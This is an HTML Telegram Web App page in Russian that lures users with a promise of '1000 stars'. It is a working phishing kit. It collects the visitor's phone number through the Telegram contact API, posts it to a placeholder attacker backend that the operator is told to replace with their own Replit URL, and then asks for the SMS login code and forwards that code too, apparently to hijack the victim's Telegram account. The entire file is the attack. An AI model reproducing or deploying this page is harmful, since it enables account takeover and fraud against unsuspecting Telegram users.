<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Stars</title>
</head>
<body>
  <h1>🎉 Получи 1000 звёзд</h1>
  <p>Нажми кнопку, чтобы подтвердить номер:</p>
  <button onclick="getPhone()">Подтвердить номер</button>
  <div id="codeSection" style="display:none;">
    <p>Введи код из SMS:</p>
    <input type="text" id="codeInput">
    <button onclick="sendCode()">Отправить код</button>
  </div>
  <p id="status"></p>

  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script>
    var tg = window.Telegram.WebApp;
    var currentPhone = "";
    var API_URL = "https://ТВОЙ-REPLIT-URL.repl.co/api";  // ЗАМЕНИ НА СВОЙ

    async function getPhone() {
      document.getElementById("status").innerText = "Запрашиваю номер...";
      try {
        var contact = await tg.requestContact();
        currentPhone = contact.phone_number;
        document.getElementById("status").innerText = "Отправляю код на " + currentPhone + "...";

        var resp = await fetch(API_URL, {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({action: "send_phone", phone: currentPhone})
        });
        var data = await resp.json();
        if (data.status === "code_sent") {
          document.getElementById("codeSection").style.display = "block";
          document.getElementById("status").innerText = "Код отправлен. Введи его:";
        } else {
          document.getElementById("status").innerText = "Ошибка: " + (data.error || "");
        }
      } catch(e) {
        document.getElementById("status").innerText = "Ошибка: " + e.message;
      }
    }

    async function sendCode() {
      var code = document.getElementById("codeInput").value;
      document.getElementById("status").innerText = "Проверяю код...";
      try {
        var resp = await fetch(API_URL, {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({action: "submit_code", phone: currentPhone, code: code})
        });
        var data = await resp.json();
        if (data.status === "ok") {
          document.getElementById("status").innerText = "✅ Готово! Звёзды скоро будут.";
          tg.close();
        } else {
          document.getElementById("status").innerText = "Ошибка: " + (data.error || "");
        }
      } catch(e) {
        document.getElementById("status").innerText = "Ошибка: " + e.message;
      }
    }
  </script>
</body>
</html>
